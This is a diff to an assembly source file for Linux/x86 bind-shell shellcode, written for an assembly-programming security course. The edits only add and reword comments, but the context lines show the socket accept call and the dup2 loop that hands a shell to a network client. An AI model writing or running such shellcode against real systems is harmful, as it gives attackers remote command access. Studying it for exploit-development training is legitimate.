@@ -1,14 +1,14 @@
 ; Linux/x86 bindshell shellcode
 ; By Daniel Roberson -- @dmfroberson -- daniel@planethacker.net
 ; 
-; For SecurityTube Linux Assembly Expert course.
+; For the SecurityTube Linux Assembly Expert course.
 ; SLAE-877
 
 BITS 32
 
 ;
-; Port number. In network byte order.
-; python -c "print hex(4444)", reverse order of hex bytes
+; Port number. In network byte order. Calculate with Python:
+; python -c "import socket; print '0x%04x' % socket.htons(1280)"
 ;
 PORT equ 0x5c11                ; port to bind to
 
@@ -61,12 +61,12 @@ push esi                       ; sockfd
 mov ecx, esp                   ; accept() arguments
 int 0x80                       ; call socketcall()
  
-xchg ebx, eax                  ; 
+xchg ebx, eax                  ; store socket fd for dup2()
  
 xor ecx, ecx                   ; zero out ecx
 mov cl, 2                      ; initialize counter
 loop:
-    xor eax, eax
+    xor eax, eax               ; zero out eax
     add eax, 63                ; dup2()
     int 0x80
     dec ecx                    ; decrease counter
